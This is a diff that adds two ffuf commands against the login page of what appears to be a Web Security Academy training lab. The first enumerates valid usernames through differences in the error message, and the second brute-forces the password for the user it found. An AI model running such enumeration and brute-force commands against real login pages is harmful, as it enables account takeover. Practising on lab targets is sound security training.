@@ -1,0 +1,13 @@
+ffuf -w username.txt \
+  -u https://0ab500f50441caea814f9d0500ab0013.web-security-academy.net/login \
+  -X POST \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "username=FUZZ&password=anothervalue" \
+  -fr "Invalid username"
+
+ffuf -w password.txt \
+  -u https://0ab500f50441caea814f9d0500ab0013.web-security-academy.net/login \
+  -X POST \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "username=arlington&password=FUZZ" \
+  > result.txt
